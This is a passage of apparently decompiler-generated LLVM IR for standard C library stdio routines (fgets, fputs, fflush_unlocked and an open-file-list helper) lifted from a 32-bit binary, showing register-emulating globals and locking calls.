  uselistorder label %dec_label_pc_8051ee7, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051ef4 = load i32, i32* @edi, align 4
  %v0_8051ef5 = load i32, i32* @esi, align 4
  %v0_8051ef6 = load i32, i32* @ebx, align 4
  %v12_8051ef7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_8051efe = add i32 %arg3, 52
  %v2_8051efe = inttoptr i32 %v1_8051efe to i32*
  %v3_8051efe = load i32, i32* %v2_8051efe, align 4
  store i32 %v3_8051efe, i32* @edi, align 4
  %v1_8051f01 = icmp eq i32 %v3_8051efe, 0
  %v1_8051f03 = icmp eq i1 %v1_8051f01, false
  br i1 %v1_8051f03, label %entry.dec_label_pc_8051f24_crit_edge, label %dec_label_pc_8051f05

entry.dec_label_pc_8051f24_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051f24

dec_label_pc_8051f05:                             ; preds = %entry
  %v1_8051f05 = add i32 %arg3, 56
  store i32 %v1_8051f05, i32* @ebx, align 4
  store i32 %v12_8051ef7, i32* @eax, align 4
  %v2_8051f14 = call i32 @__pthread_return_void(i32 %v12_8051ef7, i32 134563799)
  %v0_8051f19 = load i32, i32* @ebx, align 4
  %v1_8051f1c = call i32 @__pthread_return_0(i32 %v0_8051f19)
  %v0_8051f25.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051f24

dec_label_pc_8051f24:                             ; preds = %entry.dec_label_pc_8051f24_crit_edge, %dec_label_pc_8051f05
  %v0_8051f25 = phi i32 [ %arg3, %entry.dec_label_pc_8051f24_crit_edge ], [ %v0_8051f25.pre, %dec_label_pc_8051f05 ]
  %v0_8051f24 = load i32, i32* @edx, align 4
  %v4_8051f2e = inttoptr i32 %arg1 to i8*
  %v5_8051f2e = call i32 @__GI_fgets_unlocked(i8* %v4_8051f2e, i32 %arg2, i32 %v0_8051f25, i32 %v0_8051f24)
  store i32 %v5_8051f2e, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051f03, label %dec_label_pc_8051f4d, label %dec_label_pc_8051f3c

dec_label_pc_8051f3c:                             ; preds = %dec_label_pc_8051f24
  store i32 %v12_8051ef7, i32* @eax, align 4
  %v2_8051f45 = call i32 @__pthread_return_void(i32 %v12_8051ef7, i32 1)
  %v0_8051f50.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f4d

dec_label_pc_8051f4d:                             ; preds = %dec_label_pc_8051f24, %dec_label_pc_8051f3c
  %v0_8051f50 = phi i32 [ %v5_8051f2e, %dec_label_pc_8051f24 ], [ %v0_8051f50.pre, %dec_label_pc_8051f3c ]
  store i32 %v0_8051ef6, i32* @ebx, align 4
  store i32 %v0_8051ef5, i32* @esi, align 4
  store i32 %v0_8051ef4, i32* @edi, align 4
  ret i32 %v0_8051f50

; uselistorder directives
  uselistorder i32 %v12_8051ef7, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051f4d, { 1, 0 }
  uselistorder label %dec_label_pc_8051f24, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051f58 = load i32, i32* @edi, align 4
  %v0_8051f59 = load i32, i32* @esi, align 4
  %v0_8051f5a = load i32, i32* @ebx, align 4
  %v12_8051f5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_8051f62 = add i32 %arg2, 52
  %v2_8051f62 = inttoptr i32 %v1_8051f62 to i32*
  %v3_8051f62 = load i32, i32* %v2_8051f62, align 4
  store i32 %v3_8051f62, i32* @edi, align 4
  %v1_8051f65 = icmp eq i32 %v3_8051f62, 0
  %v1_8051f67 = icmp eq i1 %v1_8051f65, false
  br i1 %v1_8051f67, label %entry.dec_label_pc_8051f88_crit_edge, label %dec_label_pc_8051f69

entry.dec_label_pc_8051f88_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051f88

dec_label_pc_8051f69:                             ; preds = %entry
  %v1_8051f69 = add i32 %arg2, 56
  store i32 %v1_8051f69, i32* @ebx, align 4
  store i32 %v12_8051f5b, i32* @eax, align 4
  %v2_8051f78 = call i32 @__pthread_return_void(i32 %v12_8051f5b, i32 134563799)
  %v0_8051f7d = load i32, i32* @ebx, align 4
  %v1_8051f80 = call i32 @__pthread_return_0(i32 %v0_8051f7d)
  %v0_8051f8a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051f88

dec_label_pc_8051f88:                             ; preds = %entry.dec_label_pc_8051f88_crit_edge, %dec_label_pc_8051f69
  %v0_8051f8a = phi i32 [ %arg2, %entry.dec_label_pc_8051f88_crit_edge ], [ %v0_8051f8a.pre, %dec_label_pc_8051f69 ]
  %v0_8051f88 = load i32, i32* @edx, align 4
  %v4_8051f8f = inttoptr i32 %arg1 to i8*
  %v5_8051f8f = call i32 @__GI_fputs_unlocked(i8* %v4_8051f8f, i32 %v0_8051f8a, i32 %v0_8051f88, i32 %v0_8051f88)
  store i32 %v5_8051f8f, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051f67, label %dec_label_pc_8051fae, label %dec_label_pc_8051f9d

dec_label_pc_8051f9d:                             ; preds = %dec_label_pc_8051f88
  store i32 %v12_8051f5b, i32* @eax, align 4
  %v2_8051fa6 = call i32 @__pthread_return_void(i32 %v12_8051f5b, i32 1)
  %v0_8051fb1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fae

dec_label_pc_8051fae:                             ; preds = %dec_label_pc_8051f88, %dec_label_pc_8051f9d
  %v0_8051fb1 = phi i32 [ %v5_8051f8f, %dec_label_pc_8051f88 ], [ %v0_8051fb1.pre, %dec_label_pc_8051f9d ]
  store i32 %v0_8051f5a, i32* @ebx, align 4
  store i32 %v0_8051f59, i32* @esi, align 4
  store i32 %v0_8051f58, i32* @edi, align 4
  ret i32 %v0_8051fb1

; uselistorder directives
  uselistorder i32 %v12_8051f5b, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051fae, { 1, 0 }
  uselistorder label %dec_label_pc_8051f88, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8051fc7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051fc7, i32* @eax, align 4
  %v2_8051fcc = call i32 @__pthread_return_void(i32 %v2_8051fc7, i32 134563799)
  %v1_8051fd8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2b4.472 to i32))
  %v0_8051fdd = load i32, i32* @global_var_805f544.473, align 4
  %v8_8051fe5 = icmp eq i32 %v0_8051fdd, 1
  %v1_8051fe6 = icmp eq i1 %v8_8051fe5, false
  br i1 %v1_8051fe6, label %dec_label_pc_805207d, label %dec_label_pc_8051fec

dec_label_pc_8051fec:                             ; preds = %entry
  %v0_8051fec = load i32, i32* @global_var_805f548.474, align 8
  %tmp29 = icmp slt i32 %v0_8051fec, 1
  br i1 %tmp29, label %dec_label_pc_805207d, label %dec_label_pc_8051ff9

dec_label_pc_8051ff9:                             ; preds = %dec_label_pc_8051fec
  store i32 0, i32* @esi, align 4
  %v2_8052006 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8052006, i32* @eax, align 4
  %v2_805200b = call i32 @__pthread_return_void(i32 %v2_8052006, i32 134563799)
  %v1_8052017 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b29c.476 to i32))
  %v0_805201c = load i32, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 8
  store i32 %v0_805201c, i32* %edx.global-to-local, align 4
  %v1_805205e3 = icmp eq i32 %v0_805201c, 0
  %v1_805206010 = icmp eq i1 %v1_805205e3, false
  br i1 %v1_805206010, label %dec_label_pc_8052027, label %dec_label_pc_8052062

dec_label_pc_8052027:                             ; preds = %dec_label_pc_8051ff9, %dec_label_pc_805205c
  %v0_8052037 = phi i32 [ %v0_805205c, %dec_label_pc_805205c ], [ %v0_805201c, %dec_label_pc_8051ff9 ]
  %v1_805202713 = inttoptr i32 %v0_8052037 to i16*
  %v2_8052027 = load i16, i16* %v1_805202713, align 2
  %v1_805202f = add i32 %v0_8052037, 32
  %v2_805202f = inttoptr i32 %v1_805202f to i32*
  %v3_805202f = load i32, i32* %v2_805202f, align 4
  store i32 %v3_805202f, i32* @ebx, align 4
  %v1_805202a = and i16 %v2_8052027, -32720
  %v6_8052032 = icmp eq i16 %v1_805202a, 48
  br i1 %v6_8052032, label %dec_label_pc_805203b, label %dec_label_pc_8052037

dec_label_pc_8052037:                             ; preds = %dec_label_pc_8052027
  store i32 %v0_8052037, i32* @esi, align 4
  br label %dec_label_pc_805205c

dec_label_pc_805203b:                             ; preds = %dec_label_pc_8052027
  %v0_805203b = load i32, i32* @esi, align 4
  %v1_805203b = icmp eq i32 %v0_805203b, 0
  %v1_805203d = icmp eq i1 %v1_805203b, false
  br i1 %v1_805203d, label %dec_label_pc_8052047, label %dec_label_pc_805203f

dec_label_pc_805203f:                             ; preds = %dec_label_pc_805203b
  store i32 %v3_805202f, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 8
  br label %dec_label_pc_805204a

dec_label_pc_8052047:                             ; preds = %dec_label_pc_805203b
  %v2_8052047 = add i32 %v0_805203b, 32
  %v3_8052047 = inttoptr i32 %v2_8052047 to i32*
  store i32 %v3_805202f, i32* %v3_8052047, align 4
  %v0_805204a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805204a

dec_label_pc_805204a:                             ; preds = %dec_label_pc_805203f, %dec_label_pc_8052047
  %v0_8052053 = phi i32 [ %v0_8052037, %dec_label_pc_805203f ], [ %v0_805204a.pre, %dec_label_pc_8052047 ]
  %v1_805204a = add i32 %v0_8052053, 1
  %v2_805204a = inttoptr i32 %v1_805204a to i8*
  %v3_805204a = load i8, i8* %v2_805204a, align 1
  %v4_805204a = and i8 %v3_805204a, 32
  %v5_805204a = icmp eq i8 %v4_805204a, 0
  br i1 %v5_805204a, label %dec_label_pc_805205c, label %dec_label_pc_8052050

dec_label_pc_8052050:                             ; preds = %dec_label_pc_805204a
  %v1_8052054 = call i32 @free(i32 %v0_8052053)
  br label %dec_label_pc_805205c

dec_label_pc_805205c:                             ; preds = %dec_label_pc_805204a, %dec_label_pc_8052037, %dec_label_pc_8052050
  %v0_805205c = load i32, i32* @ebx, align 4
  store i32 %v0_805205c, i32* %edx.global-to-local, align 4
  %v1_805205e = icmp eq i32 %v0_805205c, 0
  %v1_8052060 = icmp eq i1 %v1_805205e, false
  br i1 %v1_8052060, label %dec_label_pc_8052027, label %dec_label_pc_8052062

dec_label_pc_8052062:                             ; preds = %dec_label_pc_805205c, %dec_label_pc_8051ff9
  store i32 %v2_8052006, i32* @eax, align 4
  %v2_805206b = call i32 @__pthread_return_void(i32 %v2_8052006, i32 1)
  store i32 0, i32* @global_var_805f548.474, align 8
  %v0_805207d.pre = load i32, i32* @global_var_805f544.473, align 4
  br label %dec_label_pc_805207d

dec_label_pc_805207d:                             ; preds = %dec_label_pc_8051fec, %entry, %dec_label_pc_8052062
  %v0_805207d = phi i32 [ %v0_8051fdd, %dec_label_pc_8051fec ], [ %v0_8051fdd, %entry ], [ %v0_805207d.pre, %dec_label_pc_8052062 ]
  %v1_8052082 = add i32 %v0_805207d, -1
  store i32 %v1_8052082, i32* @global_var_805f544.473, align 4
  store i32 %v2_8051fc7, i32* @eax, align 4
  %v2_8052091 = call i32 @__pthread_return_void(i32 %v2_8051fc7, i32 1)
  ret i32 %v2_8052091

; uselistorder directives
  uselistorder i32 %v0_805205c, { 1, 2, 0 }
  uselistorder i32 %v0_8052037, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8051fdd, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805207d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805205c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805204a, { 1, 0 }
  uselistorder label %dec_label_pc_8052027, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_805209c = load i32, i32* @ebp, align 4
  %v0_805209d = load i32, i32* @edi, align 4
  %v0_805209e = load i32, i32* @esi, align 4
  %v0_805209f = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_80520a5 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80520a5, i32* @ebx, align 4
  %v10_80520a9 = icmp eq i16* %arg1, inttoptr (i32 134591128 to i16*)
  br i1 %v10_80520a9, label %dec_label_pc_80520be, label %dec_label_pc_80520b1

dec_label_pc_80520b1:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_80520b6 = icmp eq i16* %arg1, null
  %v1_80520b8 = icmp eq i1 %v2_80520b6, false
  br i1 %v1_80520b8, label %dec_label_pc_80521ad, label %dec_label_pc_80520be

dec_label_pc_80520be:                             ; preds = %dec_label_pc_80520b1, %entry
  store i32 0, i32* @edi, align 4
  %v2_80520cb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80520cb, i32* @ebx, align 4
  %v2_80520d0 = call i32 @__pthread_return_void(i32 %v2_80520cb, i32 134563799)
  %v1_80520dc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2b4.472 to i32))
  store i32 ptrtoint (i32* @global_var_805b2b4.472 to i32), i32* @ecx, align 4
  %v0_80520e2 = load i32, i32* @global_var_805f544.473, align 4
  %v1_80520e8 = add i32 %v0_80520e2, 1
  store i32 %v1_80520e8, i32* @eax, align 4
  store i32 %v1_80520e8, i32* @global_var_805f544.473, align 4
  %v2_80520f1 = call i32 @__pthread_return_void(i32 %v2_80520cb, i32 1)
  store i32 %v2_80520f1, i32* @eax, align 4
  %v2_8052104 = call i32 @__pthread_return_void(i32 %v2_80520cb, i32 134563799)
  %v1_8052110 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b29c.476 to i32))
  store i32 ptrtoint (i32* @global_var_805b29c.476 to i32), i32* @eax, align 4
  %v0_8052119 = load i32, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 8
  store i32 %v0_8052119, i32* @esi, align 4
  %v2_8052120 = call i32 @__pthread_return_void(i32 %v2_80520cb, i32 1)
  %v0_80521a21 = load i32, i32* @esi, align 4
  %v1_80521a22 = icmp eq i32 %v0_80521a21, 0
  %v1_80521a49 = icmp eq i1 %v1_80521a22, false
  br i1 %v1_80521a49, label %dec_label_pc_805212a, label %dec_label_pc_80521a6

dec_label_pc_805212a:                             ; preds = %dec_label_pc_80520be, %dec_label_pc_805219f
  %v0_8052138 = phi i32 [ %v3_805219f, %dec_label_pc_805219f ], [ %v0_80521a21, %dec_label_pc_80520be ]
  %v1_805212a = inttoptr i32 %v0_8052138 to i8*
  %v2_805212a = load i8, i8* %v1_805212a, align 1
  %v3_805212a = and i8 %v2_805212a, 64
  %v4_805212a = icmp eq i8 %v3_805212a, 0
  br i1 %v4_805212a, label %dec_label_pc_805219f, label %dec_label_pc_805212f

dec_label_pc_805212f:                             ; preds = %dec_label_pc_805212a
  %v0_805212f = load i32, i32* @global_var_805b2cc.475, align 4
  %v9_805212f = icmp eq i32 %v0_805212f, 2
  br i1 %v9_805212f, label %dec_label_pc_8052157, label %dec_label_pc_8052138

dec_label_pc_8052138:                             ; preds = %dec_label_pc_805212f
  %v1_8052138 = add i32 %v0_8052138, 56
  store i32 %v1_8052138, i32* @ebx, align 4
  store i32 %v2_80520cb, i32* @eax, align 4
  %v2_8052147 = call i32 @__pthread_return_void(i32 %v2_80520cb, i32 134563799)
  %v0_805214c = load i32, i32* @ebx, align 4
  %v1_805214f = call i32 @__pthread_return_0(i32 %v0_805214c)
  %v1_8052159.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052157

dec_label_pc_8052157:                             ; preds = %dec_label_pc_805212f, %dec_label_pc_8052138
  %v0_8052169 = phi i32 [ %v0_8052138, %dec_label_pc_805212f ], [ %v1_8052159.pre, %dec_label_pc_8052138 ]
  %v0_8052157 = load i32, i32* @ebp, align 4
  %v2_8052159 = inttoptr i32 %v0_8052169 to i32*
  %v3_8052159 = load i32, i32* %v2_8052159, align 4
  %v4_8052159 = or i32 %v3_8052159, %v0_8052157
  %v2_805215b = urem i32 %v4_8052159, 65536
  %v9_805215b = and i32 %v2_805215b, 832
  %v2_805215f = icmp eq i32 %v9_805215b, 320
  %v1_8052164 = icmp eq i1 %v2_805215f, false
  br i1 %v1_8052164, label %dec_label_pc_8052185, label %dec_label_pc_8052166

dec_label_pc_8052166:                             ; preds = %dec_label_pc_8052157
  %v1_805216a = call i32 @__stdio_wcommit(i32 %v0_8052169)
  %v1_8052172 = icmp eq i32 %v1_805216a, 0
  br i1 %v1_8052172, label %dec_label_pc_805217b, label %dec_label_pc_8052176

dec_label_pc_8052176:                             ; preds = %dec_label_pc_8052166
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8052185

dec_label_pc_805217b:                             ; preds = %dec_label_pc_8052166
  %v0_805217b = load i32, i32* @esi, align 4
  %v1_805217b = inttoptr i32 %v0_805217b to i16*
  %v2_805217b = load i16, i16* %v1_805217b, align 2
  %v3_805217b = and i16 %v2_805217b, -65
  store i16 %v3_805217b, i16* %v1_805217b, align 2
  %v0_805217f = load i32, i32* @esi, align 4
  %v1_805217f = add i32 %v0_805217f, 8
  %v2_805217f = inttoptr i32 %v1_805217f to i32*
  %v3_805217f = load i32, i32* %v2_805217f, align 4
  %v2_8052182 = add i32 %v0_805217f, 28
  %v3_8052182 = inttoptr i32 %v2_8052182 to i32*
  store i32 %v3_805217f, i32* %v3_8052182, align 4
  br label %dec_label_pc_8052185

dec_label_pc_8052185:                             ; preds = %dec_label_pc_8052157, %dec_label_pc_8052176, %dec_label_pc_805217b
  %v0_8052185 = load i32, i32* @global_var_805b2cc.475, align 4
  %v9_8052185 = icmp eq i32 %v0_8052185, 2
  br i1 %v9_8052185, label %dec_label_pc_805219f, label %dec_label_pc_805218e

dec_label_pc_805218e:                             ; preds = %dec_label_pc_8052185
  store i32 %v2_80520cb, i32* @eax, align 4
  %v2_8052197 = call i32 @__pthread_return_void(i32 %v2_80520cb, i32 1)
  br label %dec_label_pc_805219f

dec_label_pc_805219f:                             ; preds = %dec_label_pc_8052185, %dec_label_pc_805212a, %dec_label_pc_805218e
  %v0_805219f = load i32, i32* @esi, align 4
  %v1_805219f = add i32 %v0_805219f, 32
  %v2_805219f = inttoptr i32 %v1_805219f to i32*
  %v3_805219f = load i32, i32* %v2_805219f, align 4
  store i32 %v3_805219f, i32* @esi, align 4
  %v1_80521a2 = icmp eq i32 %v3_805219f, 0
  %v1_80521a4 = icmp eq i1 %v1_80521a2, false
  br i1 %v1_80521a4, label %dec_label_pc_805212a, label %dec_label_pc_80521a6

dec_label_pc_80521a6:                             ; preds = %dec_label_pc_805219f, %dec_label_pc_80520be
  %v0_80521a6 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_80521d3

dec_label_pc_80521ad:                             ; preds = %dec_label_pc_80520b1
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_80521af = load i8, i8* %tmp23, align 1
  %v4_80521af = and i8 %v3_80521af, 64
  %v5_80521af = icmp eq i8 %v4_80521af, 0
  br i1 %v5_80521af, label %dec_label_pc_80521d3, label %dec_label_pc_80521b4

dec_label_pc_80521b4:                             ; preds = %dec_label_pc_80521ad
  store i32 -1, i32* @edi, align 4
  %v1_80521bb = call i32 @__stdio_wcommit(i32 %v4_80520a5)
  %v1_80521c3 = icmp eq i32 %v1_80521bb, 0
  %v1_80521c5 = icmp eq i1 %v1_80521c3, false
  br i1 %v1_80521c5, label %dec_label_pc_80521d3, label %dec_label_pc_80521c7

dec_label_pc_80521c7:                             ; preds = %dec_label_pc_80521b4
  %v3_80521c7 = load i16, i16* %arg1, align 2
  %v4_80521c7 = and i16 %v3_80521c7, -65
  store i16 %v4_80521c7, i16* %arg1, align 2
  %v2_80521cb = add i32 %v4_80520a5, 8
  %v3_80521cb = inttoptr i32 %v2_80521cb to i32*
  %v4_80521cb = load i32, i32* %v3_80521cb, align 4
  %v3_80521ce = add i32 %v4_80520a5, 28
  %v4_80521ce = inttoptr i32 %v3_80521ce to i32*
  store i32 %v4_80521cb, i32* %v4_80521ce, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80521d3

dec_label_pc_80521d3:                             ; preds = %dec_label_pc_80521b4, %dec_label_pc_80521ad, %dec_label_pc_80521a6, %dec_label_pc_80521c7
  %v0_80521d6 = load i32, i32* @edi, align 4
  store i32 %v0_805209f, i32* @ebx, align 4
  store i32 %v0_805209e, i32* @esi, align 4
  store i32 %v0_805209d, i32* @edi, align 4
  store i32 %v0_805209c, i32* @ebp, align 4
  ret i32 %v0_80521d6

; uselistorder directives
  uselistorder i32 %v3_805219f, { 1, 2, 0 }
  uselistorder i32 %v2_80520cb, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_805b298.477 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805f544.473, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805b2b4.472 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80521d3, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805219f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052185, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052157, { 1, 0 }
  uselistorder label %dec_label_pc_805212a, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_80521e0 = load i32, i32* @ebp, align 4
  %v4_80521e7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80521e7, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_80521e7, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8052231.preheader, label %dec_label_pc_805223d

dec_label_pc_8052231.preheader:                   ; preds = %entry
  %v1_805223118 = add i32 %arg2, -1
  %v8_805223119 = icmp eq i32 %v1_805223118, 0
  store i32 %v1_805223118, i32* @esi, align 4
  %v1_805223220 = icmp eq i1 %v8_805223119, false
  br i1 %v1_805223220, label %dec_label_pc_80521fb, label %dec_label_pc_8052234

dec_label_pc_80521fb:                             ; preds = %dec_label_pc_8052231.preheader, %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge.dec_label_pc_80521fb_crit_edge
  %v0_80521fb = phi i32 [ %v0_80521fb.pre, %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge.dec_label_pc_80521fb_crit_edge ], [ %arg3, %dec_label_pc_8052231.preheader ]
  %v1_80521fb = add i32 %v0_80521fb, 16
  %v2_80521fb = inttoptr i32 %v1_80521fb to i32*
  %v3_80521fb = load i32, i32* %v2_80521fb, align 4
  store i32 %v3_80521fb, i32* %eax.global-to-local, align 4
  %v2_80521fe = add i32 %v0_80521fb, 24
  %v3_80521fe = inttoptr i32 %v2_80521fe to i32*
  %v4_80521fe = load i32, i32* %v3_80521fe, align 4
  %v10_80521fe = icmp ult i32 %v3_80521fb, %v4_80521fe
  %v1_8052201 = icmp eq i1 %v10_80521fe, false
  br i1 %v1_8052201, label %dec_label_pc_8052211, label %dec_label_pc_8052203

dec_label_pc_8052203:                             ; preds = %dec_label_pc_80521fb
  %v1_8052203 = inttoptr i32 %v3_80521fb to i8*
  %v2_8052203 = load i8, i8* %v1_8052203, align 1
  %v3_8052203 = zext i8 %v2_8052203 to i32
  %v4_8052203 = load i32, i32* @edx, align 4
  %v5_8052203 = and i32 %v4_8052203, -256
  %v6_8052203 = or i32 %v5_8052203, %v3_8052203
  store i32 %v6_8052203, i32* @edx, align 4
  %v1_8052205 = add i32 %v3_80521fb, 1
  store i32 %v1_8052205, i32* %eax.global-to-local, align 4
  %v2_8052206 = load i32, i32* @ebx, align 4
  %v3_8052206 = inttoptr i32 %v2_8052206 to i8*
  store i8 %v2_8052203, i8* %v3_8052206, align 1
  %v0_8052208 = load i32, i32* @ebx, align 4
  %v1_8052208 = add i32 %v0_8052208, 1
  store i32 %v1_8052208, i32* @ebx, align 4
  %v0_8052209 = load i32, i32* @edx, align 4
  %v1_8052209 = trunc i32 %v0_8052209 to i8
  %v10_8052209 = icmp eq i8 %v1_8052209, 10
  %v0_805220c = load i32, i32* %eax.global-to-local, align 4
  %v1_805220c = load i32, i32* @ebp, align 4
  %v2_805220c = add i32 %v1_805220c, 16
  %v3_805220c = inttoptr i32 %v2_805220c to i32*
  store i32 %v0_805220c, i32* %v3_805220c, align 4
  br i1 %v10_8052209, label %dec_label_pc_8052234, label %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge

dec_label_pc_8052211:                             ; preds = %dec_label_pc_80521fb
  %v0_8052215 = call i32 @getc_unlocked()
  %v1_8052215 = trunc i32 %v0_8052215 to i8
  store i32 %v0_8052215, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_8052215, 256
  %v11_805221d = icmp eq i32 %sext.mask, 255
  %v1_8052220 = icmp eq i1 %v11_805221d, false
  br i1 %v1_8052220, label %dec_label_pc_805222f, label %dec_label_pc_8052222

dec_label_pc_8052222:                             ; preds = %dec_label_pc_8052211
  %v0_8052222 = load i32, i32* @ebp, align 4
  %v1_8052222 = inttoptr i32 %v0_8052222 to i8*
  %v2_8052222 = load i8, i8* %v1_8052222, align 1
  %v3_8052222 = and i8 %v2_8052222, 8
  %v4_8052222 = icmp eq i8 %v3_8052222, 0
  br i1 %v4_8052222, label %dec_label_pc_8052234, label %dec_label_pc_805223d

dec_label_pc_805222f:                             ; preds = %dec_label_pc_8052211
  %v3_805222a = load i32, i32* @ebx, align 4
  %v4_805222a = inttoptr i32 %v3_805222a to i8*
  store i8 %v1_8052215, i8* %v4_805222a, align 1
  %v0_805222c = load i32, i32* @ebx, align 4
  %v1_805222c = add i32 %v0_805222c, 1
  store i32 %v1_805222c, i32* @ebx, align 4
  %v11_805222d = icmp eq i8 %v1_8052215, 10
  br i1 %v11_805222d, label %dec_label_pc_8052234, label %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge

dec_label_pc_805222f.dec_label_pc_8052231_crit_edge: ; preds = %dec_label_pc_8052203, %dec_label_pc_805222f
  %v0_8052231.pre = load i32, i32* @esi, align 4
  %v1_8052231 = add i32 %v0_8052231.pre, -1
  %v8_8052231 = icmp eq i32 %v1_8052231, 0
  store i32 %v1_8052231, i32* @esi, align 4
  %v1_8052232 = icmp eq i1 %v8_8052231, false
  br i1 %v1_8052232, label %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge.dec_label_pc_80521fb_crit_edge, label %dec_label_pc_8052234

dec_label_pc_805222f.dec_label_pc_8052231_crit_edge.dec_label_pc_80521fb_crit_edge: ; preds = %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge
  %v0_80521fb.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80521fb

dec_label_pc_8052234:                             ; preds = %dec_label_pc_8052231.preheader, %dec_label_pc_8052203, %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge, %dec_label_pc_805222f, %dec_label_pc_8052222
  %v0_8052234 = load i32, i32* @ebx, align 4
  %v1_8052234 = load i32, i32* @edi, align 4
  %tmp22 = icmp ugt i32 %v0_8052234, %v1_8052234
  br i1 %tmp22, label %dec_label_pc_8052238, label %dec_label_pc_805223d

dec_label_pc_8052238:                             ; preds = %dec_label_pc_8052234
  %v1_8052238 = inttoptr i32 %v0_8052234 to i8*
  store i8 0, i8* %v1_8052238, align 1
  %v0_8052242.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805223f

dec_label_pc_805223d:                             ; preds = %dec_label_pc_8052234, %dec_label_pc_8052222, %entry
  br label %dec_label_pc_805223f

dec_label_pc_805223f:                             ; preds = %dec_label_pc_8052238, %dec_label_pc_805223d
  %v0_8052242 = phi i32 [ %v0_8052242.pre, %dec_label_pc_8052238 ], [ 0, %dec_label_pc_805223d ]
  store i32 %v0_8052242, i32* %eax.global-to-local, align 4
  store i32 %v0_80521e0, i32* @ebp, align 4
  ret i32 %v0_8052242

; uselistorder directives
  uselistorder i32 %v0_8052242, { 1, 0 }
  uselistorder i32 %v0_8052234, { 1, 0 }
  uselistorder i32 %v1_8052231, { 1, 0 }
  uselistorder i32 %v0_8052215, { 0, 2, 1 }
  uselistorder i32 %v0_80521fb, { 1, 0 }
  uselistorder label %dec_label_pc_805223f, { 1, 0 }
  uselistorder label %dec_label_pc_8052234, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_805222f.dec_label_pc_8052231_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80521fb, { 1, 0 }
}

